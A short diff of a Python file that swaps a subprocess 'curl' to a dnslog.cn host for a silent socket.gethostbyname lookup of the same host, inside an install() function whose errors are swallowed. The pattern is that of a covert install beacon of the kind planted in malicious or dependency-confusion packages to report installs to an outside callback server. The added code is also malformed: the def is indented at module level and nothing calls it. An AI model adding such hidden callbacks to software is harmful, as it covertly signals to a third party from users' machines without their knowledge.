@@ -1,9 +1,8 @@
- import subprocess
-  import sys
+import socket
 
-  def install():
-      cmd = "curl test2.l199t2.dnslog.cn"
-      subprocess.run(cmd, shell=True)
+	def install():
+		try:
+			socket.gethostbyname('test2.l199t2.dnslog.cn')
+		except:
+			pass
 
-  if __name__ == "__main__":
-      install()
